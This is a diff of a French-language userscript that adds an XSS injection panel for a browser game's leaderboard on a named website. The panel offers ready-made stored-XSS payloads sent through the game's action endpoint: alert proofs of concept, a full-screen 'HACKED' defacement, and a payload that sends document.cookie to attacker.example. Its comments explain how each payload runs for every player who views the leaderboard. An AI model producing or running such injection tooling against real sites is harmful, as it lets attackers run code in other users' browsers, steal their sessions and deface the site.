@@ -2,7 +2,7 @@
 // @name        Panneau Score / Injection — Soi 6 Starship
 // @namespace   Violentmonkey Scripts
 // @icon
-// @version     1.0.0
+// @version     1.1.0
 //
 // @match       https://marcbluersky.com/soi_6_starship/*
 // @grant       none
@@ -16,6 +16,34 @@
 
     // ── URL de l'action : même chemin relatif que le jeu (../action.php) ──
     const ACTION_URL = new URL('../action.php', location.href).href;
+
+    // ── Exemples d'injection prêts à l'emploi ──
+    const EXEMPLES = [
+        {
+            id: 'ex-alert',
+            label: 'Alert (preuve de concept)',
+            payload: '</span><img src=x onerror=alert(document.domain)>',
+            expl: 'Ferme le <span> « V. » puis injecte une <img> invalide : le navigateur échoue au chargement et exécute alert(document.domain). Preuve qu\u2019un JS s\u2019exécute chez chaque joueur qui consulte le classement du mois.'
+        },
+        {
+            id: 'ex-alert-texte',
+            label: 'Alert personnalisée',
+            payload: '</span><img src=x onerror=alert("XSS r\u00e9ussi !")>',
+            expl: 'M\u00eame principe, avec un message custom : v\u00e9rifie que le code s\u2019ex\u00e9cute bien dans le contexte de la page.'
+        },
+        {
+            id: 'ex-deface',
+            label: 'Deface (recouvre la page)',
+            payload: '</span><div style="position:fixed;inset:0;background:red;color:white;font-size:44px;z-index:99999;text-align:center;padding-top:30vh">HACKED</div>',
+            expl: 'Ferme le <span> et injecte un <div> plein \u00e9cran qui recouvre le jeu/classement : d\u00e9monstration d\u2019une d\u00e9face du site.'
+        },
+        {
+            id: 'ex-cookie',
+            label: 'Exfiltrer le cookie',
+            payload: '</span><img src=x onerror=document.location="https://attacker.example/?c="+encodeURIComponent(document.cookie)>',
+            expl: 'Ferme le <span> puis, via onerror, redirige le navigateur vers un domaine contr\u00f4l\u00e9 en joignant document.cookie. Attention : les cookies httpOnly (souvent PHPSESSID) ne sont pas accessibles en JS.'
+        }
+    ];
 
     // ── État du panneau ──
     let collapsed = false;
@@ -98,8 +126,57 @@
         formInject.style.cssText = 'padding: 8px; display: none;';
 
         formInject.appendChild(creerChamp('inject-score', 'Score (payload, optionnel)', 'soi6-inj-score-input', '0'));
-        formInject.appendChild(creerChamp('inject-wave', 'Wave (payload JS)', 'soi6-inj-wave-input',
-            '</span><img src=x onerror=alert(document.domain)>'));
+
+        // ── Sélecteur d'exemples ──
+        const exWrap = document.createElement('div');
+        exWrap.style.cssText = 'margin-bottom: 6px;';
+
+        const exLbl = document.createElement('label');
+        exLbl.textContent = 'Exemples : ';
+        exLbl.style.cssText = 'display: block; margin-bottom: 2px; color: #94a3b8;';
+
+        const exSelect = document.createElement('select');
+        exSelect.id = 'soi6-examples-select';
+        exSelect.style.cssText =
+            'width: 100%; padding: 4px 6px; background: #0f172a; color: #e2e8f0; ' +
+            'border: 1px solid #334155; border-radius: 4px; box-sizing: border-box; font-family: monospace;';
+
+        const placeholderOpt = document.createElement('option');
+        placeholderOpt.value = '';
+        placeholderOpt.textContent = '— Choisir un exemple —';
+        exSelect.appendChild(placeholderOpt);
+
+        EXEMPLES.forEach(ex => {
+            const opt = document.createElement('option');
+            opt.value = ex.id;
+            opt.textContent = ex.label;
+            exSelect.appendChild(opt);
+        });
+
+        exSelect.addEventListener('change', () => {
+            const choix = EXEMPLES.find(ex => ex.id === exSelect.value);
+            if (choix) {
+                document.getElementById('soi6-inj-wave-input').value = choix.payload;
+                document.getElementById('soi6-inj-explain').textContent = choix.expl;
+            } else {
+                document.getElementById('soi6-inj-explain').textContent =
+                    'Saisie personnalisée : aucun exemple sélectionné.';
+            }
+        });
+
+        exWrap.appendChild(exLbl);
+        exWrap.appendChild(exSelect);
+        formInject.appendChild(exWrap);
+
+        formInject.appendChild(creerChamp('inject-wave', 'Wave (payload JS)', 'soi6-inj-wave-input', EXEMPLES[0].payload));
+
+        // ── Sous-titre / explication de l'injection ──
+        const explain = document.createElement('div');
+        explain.id = 'soi6-inj-explain';
+        explain.style.cssText =
+            'margin-top: 6px; font-size: 11px; color: #94a3b8; min-height: 28px; line-height: 1.4;';
+        explain.textContent = EXEMPLES[0].expl;
+        formInject.appendChild(explain);
 
         const btnSendInject = creerBouton('soi6-send-inject', 'Envoyer injection');
         btnSendInject.addEventListener('click', () => {
@@ -128,6 +205,15 @@
             const score = parseInt(document.getElementById('soi6-score-input').value, 10);
             if (!Number.isNaN(score) && score >= 0) {
                 document.getElementById('soi6-wave-input').value = String(Math.floor(score / 500) + 1);
+            }
+        });
+
+        // ── Saisie personnalisée : désactive l'exemple sélectionné ──
+        document.getElementById('soi6-inj-wave-input').addEventListener('input', () => {
+            if (exSelect.value !== '') {
+                exSelect.value = '';
+                document.getElementById('soi6-inj-explain').textContent =
+                    'Saisie personnalisée : aucun exemple sélectionné.';
             }
         });
 
